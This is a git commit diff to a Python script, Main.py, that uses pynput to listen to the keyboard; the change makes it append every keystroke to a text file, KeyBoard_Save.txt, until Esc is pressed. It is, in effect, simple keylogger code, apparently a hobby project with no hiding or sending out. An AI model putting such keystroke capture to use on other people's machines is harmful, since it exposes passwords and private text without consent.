d1d06e5bd756e2387515dee90bfa313cb3bda436
peekaboo2803 <kirtanskh@gmail.com>
2024-09-01 00:25:59 -0400

    added file handaling for storing

--- Main.py
+++ Main.py
@@ -1,43 +1,20 @@
 #print('This is the main file')
 
-'''from Encription_File import *
-from pynput import keyboard
-#from pynput.keyboard import Listener
-#from pynput.mouse import Listener
-
-from pynput.keyboard import Listener
-
-#Storage = open("Keyboard_Save.txt", "a")
-
-#Fucntion with application of recording keystokes
-def on_press(key):
-    global InputKey
-    InputKey = key
-    #letterA(InputKey)
-    #Storage.write(f'{InputKey}')
-    print(f'{InputKey} pressed')
-    printing()
-    if key == keyboard.Key.esc:
-        return False  
-        # Stop listener
-
-
-
-with Listener(on_press=on_press) as listener:
-    listener.join()
-
-#Storage.close() #Closing file'''
-
 #Start from scratch
 
 from pynput import keyboard
 from pynput.keyboard import Listener
 
+Stroke = None
+
+storage = open('KeyBoard_Save.txt', 'a')
 def record_click(key):
+    global Stroke  # Declare that we are using the global variable
     try:
-        print(key.char, end='')
+        Stroke = key.char
+        storage.write(Stroke)
     except AttributeError:
-        print(f'[{key}]', end='')
+        storage.write(f'{key}')
 
 def on_release(key):
     if key == keyboard.Key.esc:
@@ -45,3 +22,5 @@ def on_release(key):
 
 with keyboard.Listener(on_press=record_click, on_release=on_release) as listener:
     listener.join()
+
+storage.close()
